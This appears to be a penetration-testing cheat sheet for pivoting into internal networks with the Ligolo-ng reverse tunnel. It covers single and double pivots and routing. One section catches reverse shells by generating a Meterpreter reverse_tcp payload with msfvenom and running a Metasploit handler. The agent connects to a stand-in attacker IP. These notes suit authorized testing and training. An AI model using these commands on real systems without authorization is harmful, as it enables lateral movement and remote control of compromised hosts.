- modern reverse tunneling tool that creates a real TUN network interface on attack host
- internal network appears directly routable → no proxychains needed
- all tools work natively: Nmap SYN scans, UDP, ICMP, GUI tools, evil-winrm, CrackMapExec
- traffic encrypted over TLS channel
- agent runs without elevated privileges on target
**install on Kali**
```bash
sudo apt install ligolo-ng
```
**or download from GitHub**
- [https://github.com/nicocha30/ligolo-ng/releases](https://github.com/nicocha30/ligolo-ng/releases)
---

**Setup — single pivot**
- create TUN interface on attack host (manual method)
```bash
    sudo ip tuntap add user $(whoami) mode tun ligolo
    sudo ip link set ligolo up
```
- or create from inside proxy terminal (modern method)
```
    ligolo-ng » interface_create --name "ligolo"
```
- start proxy on attack host
```bash
    ./proxy -selfcert
```

- run agent on pivot host
```bash
    # Linux
    ./agent -connect <attacker_ip>:11601 --ignore-cert
    # Windows
    ./agent.exe -connect <attacker_ip>:11601 -ignore-cert
```

- select session + check interfaces
```
    session
    » 1
    ifconfig
```

- start tunnel
```
    tunnel_start --tun ligolo
```

- add route to internal network on attack host
```bash
    sudo ip route add 172.16.5.0/23 dev ligolo
    # verify:
    ip route show
```

- access pivot host's ==own local services== (magic IP)
```bash
    sudo ip route add 240.0.0.1/32 dev ligolo
    # 240.0.0.1 = special Ligolo-ng IP representing the agent host itself
    nmap 240.0.0.1 -sV
    curl http://240.0.0.1:8080
```

---

**Ligolo-ng proxy commands (run inside proxy terminal)**

| command                                                          | description                                                 |
| ---------------------------------------------------------------- | ----------------------------------------------------------- |
| `session`                                                        | list and select tunnel sessions                             |
| `ifconfig`                                                       | show network interfaces of connected agent                  |
| `tunnel_start --tun ligolo`                                      | start tunnel using named TUN interface                      |
| `tunnel_stop`                                                    | stop current tunnel                                         |
| `tunnel_list`                                                    | list active tunnels                                         |
| `listener_add --addr 0.0.0.0:<port> --to 127.0.0.1:<port> --tcp` | add listener on agent → forward to attack host              |
| `listener_list`                                                  | list active listeners                                       |
| `listener_stop <ID>`                                             | stop a listener by ID                                       |
| `interface_create --name "ligolo"`                               | create TUN interface from within proxy (modern method)      |
| `interface_add_route --name ligolo --route 10.0.0.0/24`          | add route via proxy CLI                                     |
| `route_list`                                                     | list active routes                                          |
| `autoroute`                                                      | automatically read agent routing table and configure routes |
| `help`                                                           | list all available commands                                 |
| `certificate_fingerprint`                                        | show current selfcert fingerprint                           |
| `connect_agent`                                                  | attempt to connect to a bind agent                          |


**Catching reverse shells through Ligolo**
- add listener in Ligolo session (agent listens → forwards to attack host)
```
    listener_add --addr 0.0.0.0:5656 --to 127.0.0.1:4444 --tcp
```
- generate payload pointing to pivot host IP + listener port
```bash
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<pivot_IP> LPORT=5656 -f exe -o shell.exe
```
- start MSF handler on attack host port 4444
```bash
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set LHOST 0.0.0.0
    set LPORT 4444
    run
```

---

**Double pivot**
- in first agent session: add listener to relay second agent connections
```
    listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
```
- create second TUN interface on attack host
```bash
    sudo ip tuntap add user $(whoami) mode tun ligolo2
    sudo ip link set ligolo2 up
```
- run agent on second pivot host connecting through first pivot
```bash
    ./agent -connect <first_pivot_IP>:11601 -ignore-cert
```
- select second session in proxy terminal
```
    session
    » 2
    tunnel_start --tun ligolo2
```
- add route for second network
```bash
    sudo ip route add 10.1.30.0/24 dev ligolo2
```